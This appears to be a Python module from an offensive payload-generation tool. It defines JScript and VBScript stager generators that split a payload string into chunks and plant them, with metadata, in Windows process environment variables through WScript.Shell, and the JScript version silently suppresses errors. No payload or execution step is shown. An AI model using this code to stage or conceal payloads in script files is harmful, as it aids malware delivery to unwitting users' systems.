class BaseStager:
    def generate_code(self, payload_string: str, metadata: dict) -> str:
        raise NotImplementedError

    def _chunk_string(self, string, length):
        return [string[i:i+length] for i in range(0, len(string), length)]

class JScriptStager(BaseStager):
    def generate_code(self, payload_string: str, metadata: dict) -> str:
        # Escape for JScript string literal
        payload_string = payload_string.replace("\\", "\\\\").replace("'", "\\'")
        chunks = self._chunk_string(payload_string, 2048)
        stager = "// [STAGER BLOCK START]\n"
        stager += "try {\n"
        stager += "    var g2jsStagerSh = new ActiveXObject('WScript.Shell');\n"
        stager += "    var g2jsStagerEnv = g2jsStagerSh.Environment('Process');\n"
        
        # Metadata
        for key, value in metadata.items():
            stager += f"    g2jsStagerEnv('G2JS_META_{key}') = '{value}';\n"

        # Payload
        for i, chunk in enumerate(chunks):
            stager += f"    g2jsStagerEnv('G2JS_PL_{i}') = '{chunk}';\n"
            
        stager += "} catch(e) { }\n"
        stager += "// [STAGER BLOCK END]\n\n"
        return stager

class VBScriptStager(BaseStager):
    def generate_code(self, payload_string: str, metadata: dict) -> str:
        # Escape for VBScript string literal
        payload_string = payload_string.replace("\"", "\"\"")
        chunks = self._chunk_string(payload_string, 2048)
        stager = "' [STAGER BLOCK START]\n"
        stager += "Dim g2jsSh, g2jsEnv\n"
        stager += "Set g2jsSh = CreateObject(\"WScript.Shell\")\n"
        stager += "Set g2jsEnv = g2jsSh.Environment(\"Process\")\n"

        # Metadata
        for key, value in metadata.items():
            stager += f"g2jsEnv(\"G2JS_META_{key}\") = \"{value}\"\n"

        # Payload
        for i, chunk in enumerate(chunks):
            stager += f"g2jsEnv(\"G2JS_PL_{i}\") = \"{chunk}\"\n"
            
        stager += "' [STAGER BLOCK END]\n\n"
        return stager
